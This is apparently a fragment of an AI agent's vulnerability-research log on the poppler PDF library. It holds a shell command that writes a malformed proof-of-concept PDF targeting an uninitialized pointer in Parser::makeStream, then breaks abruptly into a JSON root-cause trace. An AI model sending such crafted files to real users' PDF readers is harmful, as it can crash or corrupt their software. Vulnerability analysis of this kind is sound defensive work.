message:
Running command: # Fix the startxref to point to correct offset (9)
# Already correct! Let's also try with a newline after "stream"
cat > /workspace/poc2.pdf << 'EOF'
%PDF-1.5
1 0 obj
<< /Type /XRef /Size 1 /W [0 0 0] /Root 1 0 R /Length 0 >>
stream
endstream
endobj
startxref
9
%%EOF
EOF

entry will never be assigned in makeStream"},{"step":2,"file":"poppler/XRef.cc","function":"XRef::readXRef","line":478,"var":"obj","code":"if (obj = parser->getObj(), !obj.isStream())","role":"intermediate","note":"getObj called without simpleOnly, which parses dict+stream and calls makeStream"},{"step":3,"file":"poppler/Parser.cc","function":"Parser::makeStream","line":200,"var":"entry","code":"XRefEntry *entry;","role":"root_cause","note":"entry declared without initialization; if truthy, setFlag dereferences wild pointer"}],"vuln_logic":{"source":{"file":"poppler/XRef.cc","function":"XRef::readXRef","line":463,"operands":["nullptr","parser"]},"root_cause":{"file":"poppler/Parser.cc","function":"Parser::makeStream","line":200,"operands":["entry","nullptr"],"relation":{"op":"eq","left":"entry","right":"nullptr"}},"sink":{"file":"poppler/Parser.cc","function":"Parser::makeStream","line":293,"operands":["entry","XRefEntry::Parsing"],"relation":{"op":"ne","left":"entry","right":"nullptr"}},"propagation":[{"from":{"file":"poppler/XRef.cc","function":"XRef::readXRef","line":463,"operands":["nullptr"]},"to":{"file":"poppler/Parser.cc","function":"Parser::makeStream","line":200,"operands":["entry"]},"type":"data","via":["xref member of Parser"]},{"from":{"file":"poppler/Parser.cc","function":"Parser::makeStream","line":200,"operands":["entry"]},"to":{"file":"poppler/Parser.cc","function":"Parser::makeStream","line":293,"operands":["entry"]},"type":"data","via":["entry local variable"]}]}}
